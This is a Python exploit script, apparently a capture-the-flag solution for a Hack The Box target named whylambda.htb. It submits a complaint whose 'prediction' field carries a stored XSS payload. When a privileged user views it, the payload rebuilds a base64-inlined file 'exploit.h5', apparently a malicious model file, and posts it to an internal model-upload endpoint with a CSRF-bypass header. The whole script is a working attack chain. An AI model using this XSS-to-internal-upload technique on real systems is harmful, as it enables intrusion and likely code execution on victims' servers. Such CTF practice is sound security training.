#!/usr/bin/python3.11
import requests
import base64

# Upload endpoint
TARGET = "http://whylambda.htb:31520"
COMPLAINT_ENDPOINT = "/api/complaint"

# Read and encode the file content to inline it into the payload
with open("exploit.h5", "rb") as f:
    file_b64 = base64.b64encode(f.read()).decode()

# Prepare XSS payload with correct form-data multipart POST
xss_payload = f'''<img src=x onerror="
let boundary = '----WebKitFormBoundary123456789';
let blob = atob('{file_b64}');
let bin = new Uint8Array(blob.length);
for (let i = 0; i < blob.length; i++) bin[i] = blob.charCodeAt(i);
let file = new File([bin], 'dummy_model.h5', {{type: 'application/octet-stream'}});

let fd = new FormData();
fd.append('file', file);

fetch('/api/internal/model', {{
  method: 'POST',
  body: fd,
  headers: {{
    'X-SPACE-NO-CSRF': '1'
  }}
}});
">'''

# Build proper complaint body
data = {
    "description": "trigger XSS upload",
    "image_data": "xsstest",
    "prediction": xss_payload
}

# Headers for complaint submission
headers = {
    "Content-Type": "application/json",
    "X-SPACE-NO-CSRF": "1"
}

# Submit the complaint
r = requests.post(TARGET + COMPLAINT_ENDPOINT, json=data, headers=headers)

if r.status_code != 500:
    print("[+] Complaint with XSS uploaded successfully.")
else:
    print(f"[-] Error: {r.status_code}\n{r.text}")